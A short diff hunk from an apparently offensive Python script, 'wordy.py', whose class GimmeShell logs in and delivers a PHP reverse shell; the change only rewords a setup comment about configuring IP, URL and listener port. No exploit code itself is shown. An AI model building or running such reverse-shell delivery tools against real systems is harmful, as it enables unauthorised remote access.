@@ -6,7 +6,8 @@ import requests, sys, re, thread, os
 
 class GimmeShell(object):
     # setup external payload (i.e. php-reverse-shell.php) with IP/port.
-    # setup IP in each session.get/session.post and execute with "python wordy.py <lport>"
+    # setup IP in each session.get/session.post + self.url 
+    # and execute with "python wordy.py <lport>"
     def __init__(self, portnum):
 	self.portnum = portnum
 	self._login()
